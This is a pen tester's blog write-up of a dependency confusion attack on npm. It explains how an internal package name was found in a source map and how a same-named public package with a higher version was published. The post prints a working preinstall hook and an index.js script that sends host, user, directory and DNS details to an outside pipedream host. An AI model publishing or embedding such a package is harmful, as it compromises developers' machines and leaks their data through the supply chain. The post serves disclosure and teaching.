---
title: "Dependency Confusion Attack: A Route to RCE"
date: 2023-08-31 14:00:00 +0900
categories: [web]
tags: [web, rce]
comments: false
---


Hello, amazing hackers! Today, I'm explaining one of my recent findings: the dependency confusion attack and how it can lead to remote code execution. This vulnerability was discovered during a private pen-test engagement.

---

### What is Dependency Confusion?

* A Dependency Confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository (e.g. NPM, PIP, RUBYGEMS, MVN etc.) instead of the intended file of the same name from an internal repository. The attacker can upload a package with a higher version number to the public repository.

* In this writeup, we are focusing on the **NPM** package dependency. The Dependency confusion vulnerability was discovered by [Alex Brisan](https://twitter.com/alxbrsn) and it is explained very in-depth in his [writeup](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610).

### Discovery

* The primary use case of the application was to analyze financial data submitted by users. During recon, I always prefer to manually review JavaScript files. While going through the HTTP requests related to JS files in Burp Suite, I observed an **app.randomnumbers.js.map** (source map) file.

* Generally, source map files are used for debugging purposes by developers. It is mapping between minified JS files and their original source JS files. I started reviewing the JS source map file and discovered some Node.js packages by searching for keywords such as `import`, `require`, and `node_modules`.

```javascript
//app.randomnumber.js.map
import {
    NameSpaces
}
from '../constants/namespaces';
import store from '../redux-store/store';
const { Trackevaluator } = require('ORGNAME-trackevaluator'); // Here ORGNAME indicates company name
const Context = require('./context').Context;
const ReferralContext = require('./referral.context').ReferralContext;
const evaluate = new Trackevaluator();
const camelize = (obj) => _.transform(obj, (acc, value, key, target) => {
    const camelKey = _.isArray(target) ? key : _.camelCase(key);
     acc[camelKey] = _.isObject(value) ? camelize(value) : value;
});
```
* During the analysis of the file, a package named `ORGNAME-trackevaluator` was found, as shown in the code snippet above. While searching this package on the [npmjs.com](https://www.npmjs.com/) gave 0 results, indicating a potential vulnerability to a dependency confusion attack.

![nopackagenpm](/assets/img/NPM2.png)
_package not found_

> NPM packages can also be found in the **package.json** and **package-lock.json** files. 
{: .prompt-tip }
* Instead of manually checking each package, we can use the tool called [confused](https://github.com/visma-prodsec/confused) to identify packages that are not hosted on public repositories.


### Exploitation

1. Create a package using `npm init` command. Make sure to provide higher version number during creation process of the package. 
2. In the **package.json** file, add the command `"preinstall" : "node index.js"` under `"scripts"` parameter as shown in below snippet.

    ![package.json_codesnippet](/assets/img/NPM1.png)
    _package.json file_

3. Create **index.js** file with mentioned below code. Make sure to change the hostname with your burpcollaborator or pipedream domain in the code.

```javascript
//index.js
//author:- whitehacker003@protonmail.com
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "eoty85f2nvs15dudw.m.pipedream.net", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });    
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

{:start="4"}
4. Publish the package using `npm publish` command. Verify the published package on the npm public repository.

    ![npm1](/assets/img/NPM3.png)
    _package is hosted on the npm website_

5. The preinstall script will execute `node index.js` command. Once package is installed on the system.

* After sometime of uploading the package, I received pingbacks containing the **hostname**, **directory**, **IP address**, and **username** from many systems on my server. This was fixed quickly by the developers, once it was reported.

![npmpingback](/assets/img/NPM4.png)
_remote code execution_


### Impact

* A Dependency Confusion attack, whether opportunistic or targeted, can result in widespread infections among a vendor's customers. This can empower attackers to execute unauthorized access, steal data, deploy ransomware which disrupt operations.

### References

* [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

* [Dependency Confusion](https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/)

* [Dependency Confusion Attack – What, Why, and How?](https://redhuntlabs.com/blog/dependency-confusion-attack-what-why-and-how/)


